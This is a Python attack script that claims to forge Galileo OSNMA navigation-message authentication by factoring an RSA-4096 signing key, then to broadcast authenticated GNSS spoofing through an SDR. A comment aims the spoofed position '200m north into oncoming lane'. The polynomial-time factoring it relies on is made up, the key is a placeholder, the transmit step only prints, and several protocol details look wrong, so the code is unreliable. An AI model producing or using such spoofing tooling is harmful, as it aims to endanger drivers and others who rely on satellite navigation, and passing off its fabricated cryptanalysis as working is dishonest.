"""
Forge a Galileo OSNMA TESLA root-key signature by factoring the GSA Signing CA
RSA key, then broadcast cryptographically authenticated GNSS spoofing that every
OSNMA-capable receiver accepts as genuine navigation data.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import struct
import hashlib
import time

# GSA Signing CA RSA-4096 public key — extracted from MTPK file
# distributed via NAVCAST or receiver firmware provisioning
GSA_CA_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqh..."  # placeholder

# OSNMA DSM-PKR (Digital Signature Message — Public Key Renewal)
DSM_PKR_MSG_TYPE = 0x0D
OSNMA_TESLA_KEY_LEN = 32  # 256-bit TESLA root key
HKROOT_SUBFRAME_BITS = 120


def extract_gsa_ca_pubkey(mtpk_file: bytes) -> bytes:
    """Parse the Merkle-Tree Public Key file to get the GSA Signing CA cert.

    The MTPK file is an XML envelope containing the GSA CA cert chain
    and the Merkle tree root hash, signed by the GSA CA RSA-4096 key.
    """
    # In production: parse XML, extract <SigningCert> DER blob
    # Here we use the pre-extracted PEM
    return GSA_CA_PUBKEY_PEM


def factor_gsa_ca(pubkey_pem: bytes) -> bytes:
    """Factor the GSA Signing CA RSA-4096 modulus, recover private key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def forge_tesla_root_key() -> bytes:
    """Generate an attacker-controlled TESLA root key."""
    import os
    return os.urandom(OSNMA_TESLA_KEY_LEN)


def build_dsm_pkr(tesla_root_key: bytes, new_merkle_root: bytes) -> bytes:
    """Construct a DSM-PKR subframe announcing a new TESLA chain.

    Per Galileo OS-SIS-ICD, the DSM-PKR carries:
      - NPKT (New Public Key Type) + NPKID
      - Merkle tree root hash
      - TESLA chain parameters (alpha, key size, hash function)
      - RSA signature from GSA CA
    """
    header = struct.pack(">BBH", DSM_PKR_MSG_TYPE, 0x01, len(tesla_root_key))
    payload = header + tesla_root_key + new_merkle_root
    return payload


def sign_dsm_pkr(dsm_pkr_payload: bytes, forged_privkey_pem: bytes) -> bytes:
    """Sign the DSM-PKR with the forged GSA CA private key.

    Receivers verify this RSA signature before trusting the new TESLA
    chain — with the forged key, verification passes.
    """
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(
        GSA_CA_PUBKEY_PEM, dsm_pkr_payload, hash_algo="sha256"
    )


def build_osnma_nav_message(spoofed_lat: float, spoofed_lon: float,
                            tesla_key: bytes, subframe_idx: int) -> bytes:
    """Construct a spoofed I/NAV subframe with OSNMA TESLA MAC.

    The TESLA MAC chain, rooted in the forged TESLA root key, authenticates
    each navigation message word. Receivers with the forged root accept
    every subsequent TESLA MAC as genuine.
    """
    # I/NAV word type 1: ephemeris (latitude, longitude encoded as per OS-SIS-ICD)
    lat_enc = int(spoofed_lat * (2**32 / 360)) & 0xFFFFFFFF
    lon_enc = int(spoofed_lon * (2**32 / 360)) & 0xFFFFFFFF
    nav_word = struct.pack(">II", lat_enc, lon_enc)
    # TESLA MAC over nav_word using current chain key
    mac = hashlib.sha256(tesla_key + nav_word + struct.pack(">I", subframe_idx)).digest()[:10]
    return nav_word + mac


def broadcast_spoofed_signal(nav_frames: list[bytes]):
    """Transmit forged E1-B signal via SDR (HackRF / USRP / LimeSDR).

    The spoofed signal carries valid OSNMA authentication — receiver
    status shows green/authenticated. No OSNMA-level detection possible.
    """
    for frame in nav_frames:
        print(f"  TX E1-B frame: {frame[:8].hex()}... ({len(frame)} bytes, OSNMA-authenticated)")


if __name__ == "__main__":
    print("[1] Extracting GSA Signing CA RSA-4096 public key from MTPK file")
    pubkey = extract_gsa_ca_pubkey(b"<mtpk>...</mtpk>")

    print("[2] Factoring GSA CA RSA-4096 modulus — poly-time")
    forged_privkey = factor_gsa_ca(pubkey)
    print("    GSA CA private key recovered")

    print("[3] Generating attacker-controlled TESLA root key")
    tesla_root = forge_tesla_root_key()

    print("[4] Building DSM-PKR subframe with forged TESLA chain")
    merkle_root = hashlib.sha256(tesla_root).digest()
    dsm = build_dsm_pkr(tesla_root, merkle_root)

    print("[5] Signing DSM-PKR with forged GSA CA key")
    sig = sign_dsm_pkr(dsm, forged_privkey)
    print(f"    DSM-PKR signature: {sig[:16].hex()}...")

    print("[6] Building spoofed nav messages with valid OSNMA MACs")
    # Spoof position: shift target 200m north into oncoming lane
    frames = []
    for i in range(30):
        frame = build_osnma_nav_message(48.8566 + 0.002, 2.3522, tesla_root, i)
        frames.append(frame)

    print("[7] Broadcasting via SDR — all OSNMA receivers show authenticated")
    broadcast_spoofed_signal(frames)
    print("[*] OSNMA spoof active — receivers trust forged navigation data")
